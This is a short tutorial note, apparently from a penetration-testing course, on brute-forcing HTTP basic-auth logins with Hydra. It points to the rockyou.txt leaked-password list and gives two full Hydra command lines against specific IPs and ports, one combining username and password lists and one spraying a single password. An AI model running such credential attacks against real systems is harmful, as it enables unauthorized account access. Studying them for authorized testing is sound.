# Username Brute Force using Hydra
***

#### The most used password wordlists is [rockyou.txt](https://github.com/danielmiessler/SecLists/blob/master/Passwords/Leaked-Databases/rockyou.txt.tar.gz), having more than 14 million passwords, sorted by how common they are and collected from online leaked databases of passwords and usernames.

### Username/Password Attack
#### In order to perform a brute force attack against a webservice, we would need at least 3 specific flags when credentials are in one single list:
1. Credentials
2. Target Host
3. Target Path



### Example using one wordlist for username and password
```shell
$ hydra -L /opt/useful/SecLists/Usernames/Names/names.txt -P /opt/useful/SecLists/Passwords/Leaked-Databases/rockyou.txt -u -f 170.111.111.2 -s 1337 http-get /
```

### Username Brute Force
### Example Username Brute Force
```shell
$ hydra -L /opt/useful/SecLists/Usernames/Names/names.txt -p amormio -u -f 178.35.49.134 -s 32901 http-get /
```